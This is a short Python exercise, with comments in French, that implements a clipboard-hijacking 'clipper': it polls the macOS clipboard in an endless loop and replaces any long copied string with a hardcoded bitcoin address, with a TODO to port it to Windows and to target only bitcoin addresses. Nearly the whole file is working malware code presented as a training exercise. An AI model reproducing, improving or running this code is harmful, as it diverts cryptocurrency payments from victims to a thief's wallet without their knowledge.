#-*-coding:UTF-8 -*
#!/usr/bin/env python

""" Exercise: détournement du presse-papier (clipboard hijacking)

Dans cette exercice, nous simulerons un malware qui observe en continue le contenu du presse-papier.
Dès que la victime copie une adresse bitcoin, notre programme la remplacera par une autre adresse prédéfinie.

Nous verrons également comment améliorer la portabilité de notre programme en s'assurant qu'il produise le comportement
voulu quel que soit l'OS de la victime.

Noter que le module plateform peut également être utilisé pour donner des informations sur une machines,
typiquement: nom d'hote, nom de réseau, architecture, ...

Il est également possible d'utiliser les module sys.platform ou os.name, mais ceux-ci sont moins précis.

# TODO:
- adapt to Windows using TKinter
- ajouter un module regex pour s'assurer de ne modifier que les adresses bitcoin
"""

import subprocess
import platform

# support charity: https://thewaterproject.org/
destination_address = b'1HesYJSP1QqcyPEjnQ9vzBL1wujruNGe7R'


def get_clipboard():
	p = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE) # access clipboard
	data = str(p.stdout.read())  # read data on clipboard and convert to string
	if len(data) > 33:  # if bitcoin
		swap_address(data)


def swap_address(data):
	p = subprocess.Popen(['pbcopy'], stdin=subprocess.PIPE)    # access clipboard
	p.stdin.write(destination_address)  # write destination address
	p.stdin.close()  # close clipboard


def main():
	operating_system = platform.system()

	if operating_system == "Linux" or operating_system == "Darwin":
		while True:
			get_clipboard()


if __name__ == "__main__":
	main()
